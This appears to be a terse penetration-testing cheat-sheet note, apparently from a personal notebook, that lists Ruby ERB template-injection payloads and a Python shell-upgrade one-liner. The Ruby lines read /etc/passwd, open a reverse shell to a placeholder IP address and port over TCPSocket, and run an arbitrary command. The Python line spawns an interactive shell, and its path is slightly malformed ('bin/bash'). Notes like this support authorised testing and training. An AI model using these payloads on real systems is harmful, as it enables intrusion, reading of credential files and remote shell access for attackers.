Ruby:
```ruby
<%= File.read("/etc/passwd") %>
<%= spawn("sh",[:in,:out,:err]=>TCPSocket.new("IP Address",PORT)) %>
<%= command %>
```

Python:
```shell
$ python3 -c "import pty; pty.spawn('bin/bash')"
```

How to tag [[File Transfer#Linux Client#fileless-execution]]